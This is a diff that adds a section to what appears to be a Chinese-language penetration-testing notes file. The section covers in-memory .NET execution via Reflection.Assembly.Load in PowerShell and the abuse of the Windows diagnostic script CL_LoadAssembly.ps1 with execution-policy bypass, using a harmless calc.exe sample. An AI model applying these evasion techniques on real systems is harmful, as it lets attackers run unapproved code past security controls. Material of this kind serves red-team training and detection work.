@@ -566,7 +566,55 @@ PS C:\> . C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1
 PS C:\> SyncInvoke cmd.exe "/c ipconfig > E:\ip.txt"
 ```
 
+#### Assembly.Load
 
+[Assembly.load](https://msdn.microsoft.com/en-us/library/system.reflection.assembly.load(v=vs.110).aspx)是.Net Framework中[System.Reflection](https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection?view=netframework-4.7.1) namespace中的一种方法，该方法会有多个重载版本，其中一个就是提供程序集的详细信息，即程序集的标识，包括程序集的名称，版本，区域信息，公有密钥标记,全部都是以一个字符串的形式提供，例如：“MyAssembly,Version=1.0.0.0,culture=zh-CN,PublicKeyToken=47887f89771bc57f”。它可以从内存、本地磁盘或者URL当中调用文件。.NET程序集最初只是读取权限，为了枚举与二进制文件相关联的方法和属性，又将权限更改为执行。所以这种方法只能执行C#编译的程序。
+
+这里使用以下代码进行介绍
+
+```C#
+namespace nsfocus
+{
+    public class test
+    {
+        public static void exec()
+        {
+            System.Diagnostics.Process proc = new System.Diagnostics.Process();
+            proc.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
+            proc.Start();
+        }
+        static void Main(string[] args)
+        {
+            exec();
+        }
+    }
+}
+```
+
+这样利用Assembly.Load在powershell中直接将文件读取到内存当中，并执行代码当中的shellcode
+
+```powershell
+PS C:\> $bytes = [System.IO.File]::ReadAllBytes(".\nsfocus.exe")
+PS C:\> [Reflection.Assembly]::Load($bytes)
+PS C:\> [nsfocus.test]::exec()
+```
+
+另外在windows自带的诊断工具中有一个CL_LoadAssembly.ps1文件其中也用到了该方法，同样可以用上述方法来执行C#的程序，步骤如下
+
+```powershell
+PS C:\> # powershell -v 2 -ep bypass
+PS C:\> cd C:\windows\diagnostics\system\AERO
+PS C:\windows\diagnostics\system\AERO> import-module .\CL_LoadAssembly.ps1
+PS C:\windows\diagnostics\system\AERO> LoadAssemblyFromPath ..\..\..\..\nsfocus.exe
+PS C:\windows\diagnostics\system\AERO> [nsfocus.test]::exec()
+```
+
+需要注意利用CL_LoadAssembly.ps1时，它只能执行通过.NET 2.0编译完成的程序，并且执行过程中它会调用同目录下的CL_Utility.ps1脚本，因此脚本执行必须在当前目录(C:\windows\diagnostics\system\AERO)下，另外加载的可执行程序路径也只能该路径的相对路径。
+
+Links:
+
+- https://pentestlab.blog/tag/assembly-load/
+- https://holdmybeersecurity.com/2016/09/11/c-to-windows-meterpreter-in-10mins/
 
 ### 参考
 
